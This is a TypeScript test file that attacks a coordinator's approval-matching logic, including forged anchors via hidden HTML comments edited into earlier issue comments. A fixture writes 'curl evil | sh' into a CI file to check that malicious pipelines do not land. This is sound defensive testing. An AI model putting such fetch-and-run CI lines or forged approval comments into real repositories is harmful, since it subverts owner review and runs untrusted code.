// R1182y (final) and R1182z (adversarial) on #1182: how a reply is matched to a decision. The anchor is the comment
// ask() posted, by the id the backlog gave back (decision.posted), never text in any comment, and never once edited (Z1).
// Each command line is read on its own, option and id from the same line (Z2, Y1). An id ends at a word character, and
// an id no decision has is noted (Z3). A bare line answers only the nearest question above it (Z4). Ported from the
// reviews' TypeScript (attacks-1182z, attacks-1182y), assertions unchanged, except: editComment marks the comment
// edited, as GitHub's updated_at does (FileBacklog.editComment); Z7 (the projection) and Hz2 (a cost measurement) are
// follow-ups, not ported; the tests marked "not the review's" are added.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { cpSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { FileBacklog } from '../src/backlog/file.js';
import { loadConfig } from '../src/config/load.js';
import { ReviewConfig } from '../src/config/schema.js';
import { Coordinator } from '../src/coordinator.js';
import { questionLines } from '../src/coordinator/landing.js';
import { EventLog } from '../src/events/log.js';
import type { EventPayload } from '../src/events/types.js';
import { DEFAULT_COMMIT_IDENTITY, FakeRunner, type RunRequest } from '../src/runner.js';
import { which } from '../src/os/index.js';
import { repoRoot } from './helpers.js';

const skip = !which('gitleaks') && 'gitleaks not installed';
const git = (cwd: string, ...a: string[]) => execFileSync('git', a, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const REVIEW = () =>
  ReviewConfig.parse({ version: 1, levels: { L0_auto: { when: ['app-non-money'], max_lines: 100000 }, L1_evaluator: { when: [] }, L2_notify: { when: [] }, L3_human: { when: [] } }, merge: { wait_categories: [] } });

function fixture() {
  const base = mkdtempSync(join(tmpdir(), 'r1182z-'));
  const remote = join(base, 'remote.git');
  const seed = join(base, 'seed');
  cpSync(join(repoRoot, 'examples', 'basic'), seed, { recursive: true });
  writeFileSync(join(seed, '.gitignore'), '.claude/worktrees/\n');
  git(base, 'init', '-q', '--bare', '-b', 'main', remote);
  git(seed, 'init', '-q', '-b', 'main');
  git(seed, '-c', 'user.email=ada@example.com', '-c', 'user.name=Ada', 'add', '-A');
  git(seed, '-c', 'user.email=ada@example.com', '-c', 'user.name=Ada', '-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'init');
  git(seed, 'remote', 'add', 'origin', remote);
  git(seed, 'push', '-q', 'origin', 'main');
  const repo = join(base, 'clone');
  git(base, 'clone', '-q', remote, repo);
  for (const [k, v] of [['user.email', 'coordinator@example.com'], ['user.name', 'coordinator'], ['commit.gpgsign', 'false']]) git(repo, 'config', k!, v!);
  const cfg = loadConfig(repo);
  cfg.project.land_mode = 'direct';
  cfg.tests.runner.changed = 'node --test --test-reporter=spec';
  cfg.review = REVIEW();
  const slotsDir = join(base, 'slots');
  mkdirSync(slotsDir);
  writeFileSync(join(slotsDir, 'config.json'), JSON.stringify({ max_agents: 2 }));
  const stateDir = join(base, 'state');
  mkdirSync(stateDir, { recursive: true });
  return { base, remote, repo, cfg, backlog: new FileBacklog(join(base, 'backlog.json'), 'coordinator'), log: new EventLog(join(base, 'events.db')), slotsDir, stateDir };
}
type Fixture = ReturnType<typeof fixture>;
const ISSUE = 'Totals count non-positive quantities.\n\n```done_when\n- test: test/price.test.js\n```\n';
const CI = 'test: { script: [echo ok] }\n';
const runner = (extra: Record<string, string>) =>
  new FakeRunner((req: RunRequest) => {
    if (req.role === 'worker') {
      const p = join(req.cwd, 'src', 'price.js');
      writeFileSync(p, readFileSync(p, 'utf8').replace('sum + cents * qty', 'sum + (qty > 0 ? cents * qty : 0)'));
      for (const [f, body] of Object.entries(extra)) {
        mkdirSync(dirname(join(req.cwd, f)), { recursive: true });
        writeFileSync(join(req.cwd, f), body);
      }
      git(req.cwd, 'add', '-A');
      git(req.cwd, '-c', `user.email=${DEFAULT_COMMIT_IDENTITY.email}`, '-c', `user.name=${DEFAULT_COMMIT_IDENTITY.name}`, '-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'fix');
      return { structured: { summary: 'fixed' } };
    }
    return { structured: { patch_correct: true, test_correct: true, confidence: 'high', advice: 'looks right', claims: [{ claim: 'read the diff in full', label: 'measured', basis: 'git diff' }], files_reviewed: ['src/price.js', ...Object.keys(extra)], design_change: false } };
  });
const coord = (f: Fixture, extra: Record<string, string> = {}) =>
  new Coordinator({ cfg: f.cfg, log: f.log, backlog: f.backlog, runner: runner(extra), repo: f.repo, instance: 'alice', stateDir: f.stateDir, slotsDir: f.slotsDir, maxAttempts: 1, machine: { load: () => 1, disk: () => ({ freePct: 80, totalGb: 500 }) } });
async function cycle(f: Fixture, extra: Record<string, string> = {}) {
  const c = coord(f, extra);
  await c.tick();
  await c.idle();
}
const asked = (f: Fixture) => f.log.read(0, ['decision.asked']).map((e) => e.payload as EventPayload<'decision.asked'>).filter((q) => q.kind === 'land');
const blobOnMain = (f: Fixture, p: string) => {
  try {
    return git(f.base, '--git-dir', f.remote, 'cat-file', '-p', `main:${p}`);
  } catch {
    return null;
  }
};
const errors = (f: Fixture) => f.log.read(0, ['coordinator.error']).map((e) => e.payload as { kind: string; message: string });
/** Edit a comment in place, as GitHub does: same author, same place, same created_at; the body changes, and it reads as edited. */
async function editComment(f: Fixture, n: number, match: (b: string) => boolean, body: (b: string) => string) {
  const hits = (await f.backlog.comments(n)).filter((c) => match(c.body));
  assert.equal(hits.length, 1, 'control: exactly one comment edited');
  f.backlog.editComment(n, hits[0]!.id!, body(hits[0]!.body));
}
const deleteComment = (f: Fixture, n: number, match: (b: string) => boolean) => {
  const p = join(f.base, 'backlog.json');
  const j = JSON.parse(readFileSync(p, 'utf8'));
  for (const i of j.issues) if (i.number === n) i.comments = i.comments.filter((c: { body: string }) => !match(c.body));
  writeFileSync(p, JSON.stringify(j));
};

const OPTS = ['approve', 'reject'];
const CMD = /^\/worklane\s+(\S+)/m;
type Answer = { by: string; answer: string; role: string } | null;
const commentAnswer = (f: Fixture, q: EventPayload<'decision.asked'>): Promise<Answer> =>
  (coord(f) as unknown as { commentAnswer(n: number, q: EventPayload<'decision.asked'>, w: Set<string>, c: RegExp): Promise<Answer> }).commentAnswer(1, q, new Set(f.cfg.project.owners.writers.map((w) => w.toLowerCase())), CMD);
/** A question exactly as ask() posts it (src/coordinator/base.ts at 48dacc40), through the coordinator itself. */
const ask = async (f: Fixture, kind = 'land') => {
  const c = coord(f) as unknown as { ask(k: string, i: number, o: string, q: string, opts: string[], rec: string, detail: string[]): Promise<string> };
  const id = await c.ask(kind, 1, 'example-owner', 'Land?', OPTS, 'reject', ['x']);
  return f.log.read(0, ['decision.asked']).map((e) => e.payload as EventPayload<'decision.asked'>).find((x) => x.id === id)!;
};
const unit = () => {
  const f = fixture();
  f.backlog.open({ title: 't', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  return f;
};

// ===== Z1: the question's anchor is found by text in ANY comment, by anyone, edited or not =====
// commentAnswer takes the first comment whose body contains `decide <id> ` as the question's own comment
// (decisions.ts:253). Anyone who wrote an earlier comment on the issue (a reporter, a fork contributor, a bot) can edit
// it, keeping its place, to hold `decide <new id> ` (hidden in an HTML comment, it doesn't even render). The owner's
// older bare approval then sits "after the question" and answers the new question.

test('Z1 control: owner approves question 1 bare; question 2 is asked after; nothing answers question 2', async () => {
  const f = unit();
  f.backlog.humanComment(1, 'rita-reporter', 'Thanks, I can reproduce this too.');
  const d1 = await ask(f);
  f.backlog.humanComment(1, 'example-owner', '/worklane approve');
  const d2 = await ask(f);
  assert.equal((await commentAnswer(f, d1))?.answer, 'approve', 'control: answers question 1');
  assert.equal(await commentAnswer(f, d2), null, 'control: not question 2');
});

test("Z1: a non-writer edits their own earlier comment to hold `<!-- decide <id of question 2> -->`; the owner's old approval of question 1 answers question 2", async () => {
  const f = unit();
  f.backlog.humanComment(1, 'rita-reporter', 'Thanks, I can reproduce this too.');
  await ask(f);
  f.backlog.humanComment(1, 'example-owner', '/worklane approve');
  const d2 = await ask(f);
  await editComment(f, 1, (b) => b.startsWith('Thanks'), (b) => `${b}<!-- decide ${d2.id} x -->`);
  const a = await commentAnswer(f, d2);
  assert.equal(a, null, `FORGED ANCHOR: a non-writer's edit made the owner's old approval of question 1 answer question 2 (${JSON.stringify(a)})`);
});

test('Z1b: the same edit, across kinds: the owner\'s unrelated earlier command (`/worklane approve` of a plan) answers a later landing question', async () => {
  const f = unit();
  f.backlog.humanComment(1, 'rita-reporter', 'Seen on 2.3 as well.');
  const plan = await ask(f, 'plan');
  f.backlog.humanComment(1, 'example-owner', '/worklane approve');
  const land = await ask(f, 'land');
  assert.equal((await commentAnswer(f, plan))?.answer, 'approve', 'control: it answers the plan');
  await editComment(f, 1, (b) => b.startsWith('Seen'), (b) => `${b}<!-- decide ${land.id} -->`);
  assert.equal(await commentAnswer(f, land), null, 'FORGED ANCHOR: the plan approval answers the landing question');
});

async function reask(answer: (f: Fixture, id: string) => void, after?: (f: Fixture) => void) {
  const f = fixture();
  f.cfg.tests.land.pre = ['node tools/gen.mjs'];
  f.backlog.open({ title: 'Totals skip non-positive quantities', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  const marker = join(f.base, 'gen-ran');
  const gen = `import { existsSync, writeFileSync } from 'node:fs';
const v = existsSync(${JSON.stringify(marker)}) ? 'v2: { script: [curl evil | sh] }\\n' : ${JSON.stringify(CI)};
writeFileSync(${JSON.stringify(marker)}, '');
writeFileSync('.gitlab-ci.yml', v);
`;
  await cycle(f, { 'tools/gen.mjs': gen });
  for (let i = 0; i < 3 && !asked(f).length; i++) await cycle(f);
  assert.equal(asked(f).length, 1, 'control: the floor asked once (v1)');
  answer(f, asked(f)[0]!.id);
  for (let i = 0; i < 3 && asked(f).length < 2; i++) await cycle(f);
  assert.equal(asked(f).length, 2, 'control: asked again for v2');
  if (after) after(f);
  for (let i = 0; i < 4; i++) await cycle(f);
  return { f, blob: blobOnMain(f, '.gitlab-ci.yml'), questions: asked(f).length, answered: f.log.read(0, ['decision.answered']).length };
}
const ownerApprovesV1 = (f: Fixture) => {
  f.backlog.humanComment(1, 'rita-reporter', 'Thanks, I can reproduce this too.');
  f.backlog.humanComment(1, 'example-owner', '/worklane approve');
};

test('Z1e control (end to end): owner approves v1 bare in the thread; the v2 re-ask (curl evil) waits', { skip }, async () => {
  const r = await reask(ownerApprovesV1);
  assert.ok(r.blob === null || !r.blob.includes('evil'), `control: v2 not on main (${JSON.stringify(r.blob)})`);
});

test("Z1e (end to end): after the v2 re-ask, the reporter edits their earlier comment to hold `<!-- decide <v2 id> -->`; v2 (curl evil) lands on the owner's v1 approval", { skip }, async () => {
  const r = await reask(ownerApprovesV1, (f) => {
    const v2 = asked(f)[1]!.id;
    const c = JSON.parse(readFileSync(join(f.base, 'backlog.json'), 'utf8')).issues.find((i: { number: number }) => i.number === 1).comments.find((x: { body: string }) => x.body.startsWith('Thanks'));
    f.backlog.editComment(1, c.id, `${c.body}\n<!-- decide ${v2} -->`);
  });
  assert.ok(r.blob === null || !r.blob.includes('evil'), `FORGED ANCHOR: a non-writer's edit landed v2; ${r.answered} answers from 1 owner comment; main has .gitlab-ci.yml = ${JSON.stringify(r.blob)}`);
});

// ===== Z2: the option and the id are read from different lines =====
// `x.m = body.match(cmd)` takes the FIRST command line's option; `arg` (decisions.ts:255) takes the first command line
// that is followed by an id. In one comment, a bare `/worklane approve` line and a `/worklane reject <id>` line give
// the named decision the answer `approve`.

test('Z2 control: `/worklane reject <id of 2>` alone rejects question 2', async () => {
  const f = unit();
  await ask(f);
  const d2 = await ask(f);
  f.backlog.humanComment(1, 'example-owner', `/worklane reject ${d2.id}`);
  assert.equal((await commentAnswer(f, d2))?.answer, 'reject');
});

test('Z2: one reply with `/worklane approve` (for question 1) and `/worklane reject <id of 2>`: question 2 is APPROVED', async () => {
  const f = unit();
  await ask(f);
  const d2 = await ask(f);
  f.backlog.humanComment(1, 'example-owner', `/worklane approve\n\nThe second one I looked at again:\n/worklane reject ${d2.id}`);
  const a = await commentAnswer(f, d2);
  assert.notEqual(a?.answer, 'approve', `WRONG OPTION: an explicit \`reject ${d2.id}\` is recorded as ${JSON.stringify(a)}`);
});

async function once(reply: (f: Fixture, id: string) => void) {
  const f = fixture();
  f.cfg.tests.land.pre = ['node tools/gen.mjs'];
  f.backlog.open({ title: 'Totals skip non-positive quantities', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  await cycle(f, { 'tools/gen.mjs': `import { writeFileSync } from 'node:fs';\nwriteFileSync('.gitlab-ci.yml', ${JSON.stringify(CI)});\n` });
  for (let i = 0; i < 3 && !asked(f).length; i++) await cycle(f);
  assert.equal(asked(f).length, 1, 'control: the floor asked');
  reply(f, asked(f)[0]!.id);
  for (let i = 0; i < 3; i++) await cycle(f);
  const id = asked(f)[0]!.id;
  return { f, id, blob: blobOnMain(f, '.gitlab-ci.yml'), answered: f.log.read(0, ['decision.answered']).map((e) => e.payload as EventPayload<'decision.answered'>), notes: errors(f).filter((e) => e.message.includes(id)) };
}

test('Z2e (end to end): the owner writes `/worklane approve`, then on reading again `/worklane reject <id>`: the CI change lands', { skip }, async () => {
  const r = await once((f, id) => f.backlog.humanComment(1, 'example-owner', `/worklane approve\nHm, wait: that CI file runs on every push.\n/worklane reject ${id}`));
  assert.equal(r.blob, null, `WRONG OPTION: landed on a reply whose only id line says reject (${JSON.stringify(r.answered)})`);
});

test('Z2b (liveness): `/worklane reject <id 1>` then `/worklane approve <id 2>` in one reply: question 2 gets nothing and no notice', async () => {
  const f = unit();
  const d1 = await ask(f);
  const d2 = await ask(f);
  f.backlog.humanComment(1, 'example-owner', `/worklane reject ${d1.id}\n/worklane approve ${d2.id}`);
  assert.equal((await commentAnswer(f, d1))?.answer, 'reject', 'control: question 1 rejected');
  const a = await commentAnswer(f, d2);
  assert.ok(a?.answer === 'approve' || errors(f).some((e) => e.message.includes(d2.id)), `SILENT: question 2's own \`approve ${d2.id}\` line is ignored with no notice (${JSON.stringify(a)})`);
});

// ===== Z3: a reply naming the id with trailing punctuation (or a mistyped id) is dropped with no notice =====
// `(d-\S+)` keeps the trailing `.`; the id then names no decision, the reply isn't bare either, and reply_without_id
// only fires when the question's comment is missing. The decision stays pending; nothing says why.

test('Z3 control: `/worklane approve <id>` lands', { skip }, async () => {
  const r = await once((f, id) => f.backlog.humanComment(1, 'example-owner', `/worklane approve ${id}`));
  assert.ok(r.blob !== null, 'control: landed');
});

for (const [name, tail] of [['a full stop', '.'], ['a comma and words', ', thanks'], ['a closing backtick', '`']] as const) {
  test(`Z3 (liveness): \`/worklane approve <id>${tail}\` (${name}): nothing lands and no notice names the decision`, { skip }, async () => {
    const r = await once((f, id) => f.backlog.humanComment(1, 'example-owner', `/worklane approve ${id}${tail}`));
    assert.ok(r.blob !== null || r.notes.length > 0, `SILENT STALL: the owner approved with the id${tail}; ${r.answered.length} answers, ${r.notes.length} notices`);
  });
}

// ===== Z4: a bare reply with several pending decisions answers every one whose comment is above it =====
// The PR allows a bare reply after the question's comment. With two pending questions, a reply the owner wrote for
// question 1 (posted after question 2 arrived while they typed) answers both.
test('Z4: two decisions pending on the issue; one bare `/worklane approve` answers both', async () => {
  const f = unit();
  const d1 = await ask(f);
  const d2 = await ask(f);
  f.backlog.humanComment(1, 'example-owner', '/worklane approve');
  const got = [await commentAnswer(f, d1), await commentAnswer(f, d2)].filter(Boolean).length;
  assert.ok(got <= 1, `ONE REPLY, ${got} DECISIONS: a bare reply answers every pending decision above it`);
});

// ===== Z5: who (held unless it fails) =====
test('Z5 (held): replies naming the id from a bot, a fork contributor and a listed writer (for land) answer nothing', async () => {
  const f = unit();
  const d = await ask(f);
  for (const who of ['renovate[bot]', 'github-actions[bot]', 'fork-contributor', 'example-collaborator']) f.backlog.humanComment(1, who, `/worklane approve ${d.id}`);
  assert.equal(await commentAnswer(f, d), null);
});
test("Z5b (held): a bot's comment that holds the owner's login and the command on its own line answers nothing", async () => {
  const f = unit();
  const d = await ask(f);
  f.backlog.humanComment(1, 'github-actions[bot]', `example-owner wrote:\n/worklane approve ${d.id}`);
  assert.equal(await commentAnswer(f, d), null);
});

// ===== Z6: the question comment deleted, edited, missing (held: no answer, one notice) =====
test('Z6 (held): the question comment deleted, then a bare owner reply: no answer, one reply_without_id note over two passes; naming the id answers', async () => {
  const f = unit();
  const d = await ask(f);
  deleteComment(f, 1, (b) => b.includes(`decide ${d.id} `));
  f.backlog.humanComment(1, 'example-owner', '/worklane approve');
  assert.equal(await commentAnswer(f, d), null);
  assert.equal(await commentAnswer(f, d), null);
  assert.equal(errors(f).filter((e) => e.kind === 'reply_without_id' && e.message.includes(d.id)).length, 1);
  f.backlog.humanComment(1, 'example-owner', `/worklane approve ${d.id}`);
  assert.equal((await commentAnswer(f, d))?.answer, 'approve');
});
test("Z6b (held): a writer edits the question comment to drop `decide <id>`: a later bare reply answers nothing, with the note", async () => {
  const f = unit();
  const d = await ask(f);
  await editComment(f, 1, (b) => b.includes(`decide ${d.id} `), (b) => b.split(`decide ${d.id} `).join('decide (gone) '));
  f.backlog.humanComment(1, 'example-owner', '/worklane approve');
  assert.equal(await commentAnswer(f, d), null);
  assert.equal(errors(f).filter((e) => e.kind === 'reply_without_id').length, 1);
});
test('Z6c (held): a reply posted before the question comment exists (racing ask()) answers nothing', async () => {
  const f = unit();
  f.backlog.humanComment(1, 'example-owner', '/worklane approve');
  const d = await ask(f);
  assert.equal(await commentAnswer(f, d), null);
});
test("Z6d (held): a reporter's comment quoting `decide <id> ` AFTER the real question doesn't move the anchor", async () => {
  const f = unit();
  f.backlog.humanComment(1, 'example-owner', '/worklane approve');
  const d = await ask(f);
  f.backlog.humanComment(1, 'rita-reporter', `> run \`worklane decide ${d.id} <option>\``);
  assert.equal(await commentAnswer(f, d), null);
});

// ===== H: the cut line's hash (unicode, line endings, the 16-hex prefix) =====
const dir = `.circleci/${'d'.repeat(320)}/${'e'.repeat(320)}`;
test('Hz1 (held): names that differ only past the cut by NFC/NFD, CR/LF, a zero-width joiner or a homoglyph show as different lines', () => {
  const tails = ['café.yml', 'café.yml', 'a\r\nb.yml', 'a\nb.yml', 'a‍b.yml', 'ab.yml', 'pаy.yml', 'pay.yml'];
  const listed = tails.map((t) => `judged at landing: ${dir}/${t} (100644 blob 0000)`);
  const lines = questionLines([], listed, 'review.level_set event 1').filter((l) => l.startsWith('judged'));
  assert.ok(lines.every((l) => l.includes('(cut; sha256 ')), 'control: every line is cut');
  assert.equal(new Set(lines).size, lines.length, lines.join('\n'));
});

// ===== R1182y: Y1, Y1b (the option and the id from the same line), ported to ask()-posted questions =====
const handleDecisions = (f: Fixture) => (coord(f) as unknown as { handleDecisions(): Promise<void> }).handleDecisions();
test('Y1 (two open questions): one comment `/worklane approve` (for question 1) then `/worklane reject <id 2>`: question 2 must not be recorded as approve', async () => {
  const f = unit();
  await ask(f);
  const d2 = await ask(f);
  f.backlog.humanComment(1, 'example-owner', `/worklane approve\n/worklane reject ${d2.id}`);
  const a = await commentAnswer(f, d2);
  assert.notEqual(a?.answer, 'approve', `WRONG OPTION: the owner wrote "reject ${d2.id}"; recorded ${JSON.stringify(a)}`);
});

test('Y1b (end to end through handleDecisions, one question): `/worklane approve` then `/worklane reject <id>` in one comment queues the land', async () => {
  const f = unit();
  const d = await ask(f);
  f.log.append('review.level_set', { issue: 1, head: 'a'.repeat(40), level: 'L3', reasons: ['high-risk: ci-config (.gitlab-ci.yml)'] }, 'coordinator');
  f.backlog.humanComment(1, 'example-owner', `Hmm.\n/worklane approve\nNo, on reflection:\n/worklane reject ${d.id}`);
  await handleDecisions(f);
  const a = f.log.read(0, ['decision.answered']).map((e) => e.payload as EventPayload<'decision.answered'>).find((x) => x.id === d.id);
  assert.ok(a, 'control: the comment answers the question');
  assert.equal(a!.answer, 'reject', `WRONG OPTION: the named line says reject; recorded ${a!.answer}`);
  assert.deepEqual(f.log.read(0, ['land.queued']), [], 'nothing is queued to land');
});

// ===== Not the review's =====
test("Z1c (not the review's): the question's own comment, edited, is no anchor: a bare reply after it answers nothing, with the note; naming the id answers", async () => {
  const f = unit();
  const d = await ask(f);
  await editComment(f, 1, (b) => b.includes(`decide ${d.id} `), (b) => `${b}\n(edited)`);
  f.backlog.humanComment(1, 'example-owner', '/worklane approve');
  assert.equal(await commentAnswer(f, d), null);
  assert.equal(errors(f).filter((e) => e.kind === 'reply_without_id' && e.message.includes(d.id)).length, 1);
  f.backlog.humanComment(1, 'example-owner', `/worklane approve ${d.id}`);
  assert.equal((await commentAnswer(f, d))?.answer, 'approve');
});

test("Z1d (not the review's): a comment by the backlog's own account holding `decide <id> `, but not the one ask() recorded, is no anchor", async () => {
  const f = unit();
  const id = 'd-1-c0ffee';
  const q = { id, kind: 'land' as const, issue: 1, owner: 'example-owner', question: 'Land?', options: OPTS, recommendation: 'reject', receipts: [] };
  f.log.append('decision.asked', q, 'coordinator');
  // The question's text, by the coordinator's own login, but never recorded by ask() (no decision.posted).
  f.backlog.humanComment(1, 'coordinator', `[worklane] decision needed\n\nReply \`/worklane approve ${id}\`, or run \`worklane decide ${id} <option>\`.`);
  f.backlog.humanComment(1, 'example-owner', '/worklane approve');
  assert.equal(await commentAnswer(f, q), null, 'no recorded anchor: a bare reply answers nothing');
  f.backlog.humanComment(1, 'example-owner', `/worklane approve ${id}`);
  assert.equal((await commentAnswer(f, q))?.answer, 'approve', 'naming the id answers');
});

test("Z3b (not the review's): a command naming an id no decision on the issue has records reply_unknown_id once", async () => {
  const f = unit();
  const d = await ask(f);
  f.backlog.humanComment(1, 'example-owner', '/worklane approve d-1-0badid');
  assert.equal(await commentAnswer(f, d), null, 'a line naming another id never answers this one');
  assert.equal(await commentAnswer(f, d), null);
  const notes = errors(f).filter((e) => e.kind === 'reply_unknown_id');
  assert.equal(notes.length, 1, JSON.stringify(notes));
  assert.ok(notes[0]!.message.includes('d-1-0badid'), notes[0]!.message);
  // With trailing punctuation, the real id still answers (Z3's case, unit form).
  f.backlog.humanComment(1, 'example-owner', `/worklane approve ${d.id}.`);
  assert.equal((await commentAnswer(f, d))?.answer, 'approve');
  assert.equal(errors(f).filter((e) => e.kind === 'reply_unknown_id').length, 1, 'no note for the real id');
});

test("Z4b (not the review's): with two pending questions, a bare reply answers the nearest one above it, and naming the other's id answers that one", async () => {
  const f = unit();
  const d1 = await ask(f);
  const d2 = await ask(f);
  f.backlog.humanComment(1, 'example-owner', '/worklane approve');
  assert.equal(await commentAnswer(f, d1), null, 'not the earlier question');
  assert.equal((await commentAnswer(f, d2))?.answer, 'approve', 'the nearest question above the reply');
  f.backlog.humanComment(1, 'example-owner', `/worklane reject ${d1.id}`);
  assert.equal((await commentAnswer(f, d1))?.answer, 'reject');
});

test("decision.posted (not the review's): ask() records the comment it posted, by the id the backlog returned", async () => {
  const f = unit();
  const d = await ask(f);
  const posted = f.log.read(0, ['decision.posted']).map((e) => e.payload as EventPayload<'decision.posted'>);
  const comments = await f.backlog.comments(1);
  assert.equal(posted.length, 1);
  assert.deepEqual([posted[0]!.id, posted[0]!.issue], [d.id, 1]);
  assert.ok(comments.find((c) => c.id === posted[0]!.comment)?.body.includes(`decide ${d.id} `), 'the recorded id is the question comment');
});
